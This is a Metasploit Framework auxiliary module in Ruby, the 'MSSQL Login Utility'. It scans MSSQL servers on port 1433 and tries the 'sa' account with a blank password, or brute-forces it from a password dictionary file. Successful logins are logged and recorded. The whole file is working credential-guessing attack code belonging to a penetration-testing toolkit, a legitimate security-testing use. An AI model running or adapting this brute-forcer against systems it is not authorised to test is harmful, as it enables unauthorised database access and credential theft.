##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
        
	include Msf::Exploit::Remote::MSSQL
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	
	def initialize
		super(	
			'Name'           => 'MSSQL Login Utility',
			'Version'        => '$Revision$',
			'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
			'Author'         => 'MC',
			'License'        => MSF_LICENSE
		)
	
		register_options(
			[
				OptString.new('MSSQL_PASS_FILE', [ false, 'A dictionary of passwords to perform a bruteforce attempt', '']),
				Opt::RPORT(1433)
			], self.class)
	end
		
	def run_host(ip)

		user = datastore['MSSQL_USER'].to_s
		@passwds = []
		if datastore['MSSQL_PASS_FILE'].to_s != ''
			File.open(datastore['MSSQL_PASS_FILE'], "r") do |fd|
				buff = fd.read(fd.stat.size)
				buff.split("\n").each do |line|
                    line.strip!
                    next if line =~ /^#/
                    @passwds << line if not @passwds.include?(line)
                end
			end
		else
			@passwds << datastore['MSSQL_PASS'].to_s
		end

		user = "sa" if user.empty?
		@passwds.each do |pass|		
			print_status("Trying username:'#{user}' with password:'#{pass}' against #{ip}:#{rport}")
			begin
			info = mssql_login(user, pass)

			if (info == true)
				print_status("#{ip}:#{rport} successful logged in as '#{user}' with password '#{pass}'")
				report_auth_info(
					:host   => ip,
					:proto  => 'MSSQL',
					:user   => user,
					:pass   => pass,
					:targ_host      => ip,
					:targ_port      => rport
				)
                	else
				print_status("#{ip}:#{rport} failed to login as '#{user}'")
			end
			rescue ::Interrupt
				raise $!
			rescue ::Rex::ConnectionError
			end
		end	
	end
end
